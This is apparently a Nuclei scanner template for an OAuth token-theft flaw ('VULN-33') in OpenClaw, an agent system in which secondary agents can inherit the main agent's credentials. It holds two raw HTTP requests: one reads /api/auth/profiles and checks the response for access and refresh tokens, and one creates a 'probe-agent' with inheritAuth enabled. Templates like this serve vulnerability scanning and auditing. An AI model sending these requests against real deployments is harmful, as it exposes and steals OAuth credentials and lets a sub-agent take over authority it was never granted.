http:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - access_token
    - refresh_token
    - credential
  matchers-condition: and
  raw:
  - 'GET /api/auth/profiles HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer {{token}}

    '
- matchers:
  - status:
    - 200
    - 201
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/agents HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Authorization: Bearer {{token}}


    {"name":"probe-agent","type":"secondary","inheritAuth":true}

    '
id: openclaw-oauth-token-theft
info:
  author: LobsterGuard
  description: 'Secondary agents can inherit main agent OAuth credentials via

    adoptNewerMainOAuthCredential(). Malicious sub-agent steals tokens.

    Source: agents/auth-profiles/oauth.ts:131-156

    '
  name: OpenClaw OAuth Cross-Agent Token Theft (VULN-33)
  severity: high
  tags: openclaw,oauth,credential,v4
